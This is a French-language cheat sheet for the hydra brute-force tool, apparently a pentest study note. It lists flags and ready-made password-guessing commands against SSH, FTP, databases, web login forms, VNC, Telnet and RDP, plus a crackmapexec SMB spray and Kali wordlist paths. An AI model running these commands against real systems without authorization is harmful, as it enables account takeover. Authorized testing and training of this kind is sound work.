# hydra — cheat sheet

> Outil de brute force généraliste — supporte une cinquantaine de protocoles.
> À utiliser uniquement sur des systèmes dont tu as l'autorisation.

---

## syntaxe de base

```bash
hydra -l <user> -P <wordlist> <protocole>://<IP>
hydra -L <users_list> -P <wordlist> <protocole>://<IP>
hydra -l <user> -p <password> <protocole>://<IP>     # tester un seul credential
```

---

## flags essentiels

| flag | nom | effet |
|------|-----|-------|
| `-l <user>` | login | username unique |
| `-L <fichier>` | login list | liste de usernames |
| `-p <pass>` | password | password unique |
| `-P <fichier>` | password list | wordlist de passwords |
| `-s <port>` | service port | port non standard |
| `-t <n>` | tasks | nombre de threads parallèles (défaut: 16) |
| `-v` | verbose | affiche chaque tentative |
| `-V` | very verbose | affiche login+pass à chaque essai |
| `-f` | found | stop dès le premier succès |
| `-F` | found all | stop dès le premier succès par host |
| `-o <fichier>` | output | sauvegarder les résultats |
| `-e nsr` | extra | tester: n=blank, s=login=pass, r=reverse login |
| `-w <n>` | wait | timeout en secondes |
| `-R` | restore | reprendre une session interrompue |

---

## protocoles courants

```bash
ssh://IP
ftp://IP
telnet://IP
http-get://IP
http-post-form://IP
smb://IP
rdp://IP
mysql://IP
postgres://IP
vnc://IP
smtp://IP
imap://IP
pop3://IP
```

---

## exemples par protocole

### SSH
```bash
hydra -l root -P rockyou.txt ssh://192.168.1.10
hydra -L users.txt -P rockyou.txt ssh://192.168.1.10 -t 4
```

### FTP
```bash
hydra -l admin -P rockyou.txt ftp://192.168.1.10
hydra -l anonymous -p anonymous ftp://192.168.1.10    # tester l'accès anonyme
```

### MySQL
```bash
hydra -l root -P rockyou.txt mysql://192.168.1.10
hydra -l root -p "" mysql://192.168.1.10              # tester sans mot de passe
```

### PostgreSQL
```bash
hydra -l postgres -P rockyou.txt postgres://192.168.1.10 -s 5432
hydra -l postgres -p postgres postgres://192.168.1.10 -s 5432
```

### SMB — utiliser crackmapexec à la place
```bash
# hydra SMB ne supporte pas SMBv2 — préférer crackmapexec
crackmapexec smb 192.168.1.10 -u user -P rockyou.txt
```

### HTTP formulaire login
```bash
hydra -l admin -P rockyou.txt http-post-form://192.168.1.10"/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### VNC
```bash
hydra -P rockyou.txt vnc://192.168.1.10    # VNC n'a pas de username
```

### Telnet
```bash
hydra -l root -P rockyou.txt telnet://192.168.1.10
```

### RDP (Windows)
```bash
hydra -l administrator -P rockyou.txt rdp://192.168.1.10 -t 4
```

---

## port non standard

```bash
hydra -l postgres -P rockyou.txt postgres://192.168.1.10 -s 5433
hydra -l admin -P rockyou.txt ssh://192.168.1.10 -s 2222
```

---

## options utiles

### tester login = password (très courant)
```bash
hydra -l admin -e s ssh://192.168.1.10       # s = same, teste admin:admin
hydra -L users.txt -e nsr ssh://192.168.1.10  # n=blank, s=same, r=reverse
```

### limiter les threads (éviter de bloquer le service)
```bash
hydra -l root -P rockyou.txt ssh://192.168.1.10 -t 4    # 4 threads
hydra -l root -P rockyou.txt smb://192.168.1.10 -t 1    # SMB = 1 thread obligatoire
```

### sauvegarder et reprendre
```bash
hydra -l root -P rockyou.txt ssh://192.168.1.10 -o results.txt
hydra -R    # reprendre la dernière session interrompue
```

---

## lire les résultats

```
[22][ssh] host: 192.168.1.10   login: root   password: toor
```

`[port][protocole] host: IP login: user password: mdp`

---

## hydra vs crackmapexec

| | hydra | crackmapexec |
|--|-------|-------------|
| protocoles | ~50 protocoles | SMB, LDAP, SSH, RDP, MSSQL, WINRM |
| SMBv2 | non supporté | oui |
| facilité | simple | simple |
| usage | tout sauf SMB moderne | environnements Windows/AD |

**Règle :** port SMB 445 → crackmapexec. Tout le reste → hydra.

---

## wordlists utiles sur Kali

```
/usr/share/wordlists/rockyou.txt          # 14M mots de passe — référence
/usr/share/wordlists/fasttrack.txt        # mots de passe courants — rapide
/usr/share/seclists/Passwords/            # collections variées
/usr/share/seclists/Usernames/            # listes de usernames
```